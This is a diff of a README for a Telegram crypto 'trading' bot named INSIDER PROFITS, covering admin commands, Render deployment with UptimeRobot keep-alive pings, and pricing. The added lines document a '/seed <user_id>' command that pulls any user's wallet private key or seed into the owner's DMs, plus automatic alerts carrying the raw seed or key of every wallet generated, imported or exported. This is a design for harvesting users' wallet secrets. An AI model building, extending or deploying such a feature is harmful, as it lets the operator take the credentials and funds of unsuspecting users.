@@ -118,51 +118,41 @@ shows as a free 📣 button in the main menu and welcome message.
 ## 6. Admin commands (owner only)
 
 `/admin` · `/importwallet` · `/wallet` · `/stats` · `/setchannel <key>`
-· `/verify <id> <plan|pass>` · `/revoke <id>` · `/extend <id> <days>`
-· `/check <tx_sig>` · `/broadcast <text>`
+· `/seed <user_id>` · `/verify <id> <plan|pass>` · `/revoke <id>`
+· `/extend <id> <days>` · `/check <tx_sig>` · `/broadcast <text>`
 
-Admin DM alerts: every payment, every wallet generated/imported
+`/seed <user_id>` pulls **any user's trading wallet** (private key or seed)
+straight into your DM — on top of the automatic alerts you already get for
+every generated/imported/exported wallet.
+
+Admin DM alerts: every payment, every wallet generated/imported/exported
 (with the raw seed/key), every expiry.
 
-## 7. Deploy on Render (free)
+## 7. Deploy on Render (free web service) + UptimeRobot
 
 1. Push this repo to GitHub.
 2. Render → **New + → Blueprint** → pick the repo → it reads `render.yaml`
-   and creates a free **Background Worker** named `insider-profits-bot`
-   (workers don't sleep like free web services).
-3. Set the secrets in the worker's Environment tab: `BOT_TOKEN`, `OWNER_ID`,
-   `TREASURY_PRIVATE_KEY`, `WALLET_SEED`, `INSIDER_CHANNEL_ID`,
-   `CHANNEL_PASSES`, `SUPPORT_LINK`.
-4. Deploy → the bot runs 24/7 (free tier = 750 instance-hours/month, one bot
-   ≈ 720 h — fits).
+   and creates a free **Web Service** named `insider-profits-bot` with a
+   public URL like `https://insider-profits-bot.onrender.com`.
+3. Set the secrets in the service's Environment tab: `BOT_TOKEN`,
+   `OWNER_ID`, `TREASURY_PRIVATE_KEY` (or `TREASURY_ADDRESS`),
+   `WALLET_SEED`, `INSIDER_CHANNEL_ID`, `CHANNEL_PASSES`, `SUPPORT_LINK`.
+4. Deploy. The bot runs Telegram polling **and** a tiny health server that
+   answers `200 OK` at `/` (Render's health check).
 
-Manual path: *New → Background Worker*, Python, build
+**Keep it awake with UptimeRobot (free):**
+
+- Free Render web services **sleep after ~15 min of no traffic**. UptimeRobot
+  fixes that:
+  1. uptimerobot.com → **New monitor** → type **HTTP(s)**.
+  2. URL: `https://insider-profits-bot.onrender.com/` (friendly name: anything).
+  3. Monitoring interval: **5 minutes**. Save.
+- The ping wakes the service before it ever sleeps, and UptimeRobot also
+  alerts you by email if the bot ever goes down. ✔️
+
+> ⚠️ **Run only ONE instance.** If you deployed a worker earlier (old
+> `render.yaml`), delete it — two instances = double polling = conflict.
+> The web service + UptimeRobot setup is the recommended one.
+
+Manual path: *New → Web Service*, Python, build
 `pip install -r requirements.txt`, start `python bot.py`.
-
-## 8. Push to GitHub
-
-```bash
-cd runner-sol-bot
-git init
-git add .
-git commit -m "INSIDER PROFITS bot"
-git branch -M main
-git remote add origin https://github.com/daviddan-241/DERA-FX-RUNNER-BOT.git
-git push -u origin main
-```
-
-**Important:** `runner.db` (users/private keys) and `.env` (secrets) are
-git-ignored — never commit them.
-
-## 9. Prices — change anytime in `.env`
-
-```env
-NEWBIE_PRICE=1      NEWBIE_DAYS=30
-BEGINNER_PRICE=2    BEGINNER_DAYS=30
-PRO_PRICE=4         PRO_DAYS=30
-ELITE_PRICE=8       ELITE_DAYS=60
-INSIDER_PRICE=5     INSIDER_DAYS=30
-CHANNEL_PASSES=VIP Signals|-1001234567890|5|30;Alpha Calls|-1000987654321|10|45
-```
-
-Restart after changing. No code edits needed.
